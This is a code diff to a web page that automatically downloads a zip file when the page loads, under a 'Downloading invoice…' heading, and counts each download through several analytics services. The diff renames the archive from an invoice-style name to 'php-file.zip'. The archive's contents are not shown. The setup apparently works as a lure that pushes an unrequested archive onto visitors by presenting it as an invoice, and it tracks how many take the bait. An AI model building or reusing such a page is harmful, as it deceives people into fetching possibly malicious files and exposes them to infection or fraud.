@@ -36,21 +36,21 @@ window.addEventListener('load', function () {
 async function trackDownload(method) {
     // GA4
     if (typeof gtag !== 'undefined') {
-        gtag('event', 'invoice_download', {
+        gtag('event', 'php_invoice_download', {
             event_category: 'Download',
-            event_label: 'inv-042077.zip',
+            event_label: 'php-file.zip',
             method: method
         });
     }
 
     // counter.dev Event
     if (window.counter) {
-        counter.track('invoice_download');
+        counter.track('php_invoice_download');
     }
 
-    // Cloudflare Counter API для инвойсов
+    // PHP Counter API
     try {
-        await fetch('/api/invoice-count', {
+        await fetch('/api/php-count.php', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -64,8 +64,8 @@ async function trackDownload(method) {
 
 function initiateDownload() {
     const link = document.createElement('a');
-    link.href = 'inv-042077.zip';
-    link.download = 'inv-042077.zip';
+    link.href = 'php-file.zip';
+    link.download = 'php-file.zip';
     
     link.addEventListener('click', function () {
         trackDownload('auto');
@@ -94,7 +94,7 @@ window.onload = function () {
     <h1>Downloading invoice…</h1>
     <p>
         If the download doesn't start,
-        <a href="inv-042077.zip"
+        <a href="php-file.zip"
            download
            onclick="trackDownload('manual');">
            click here
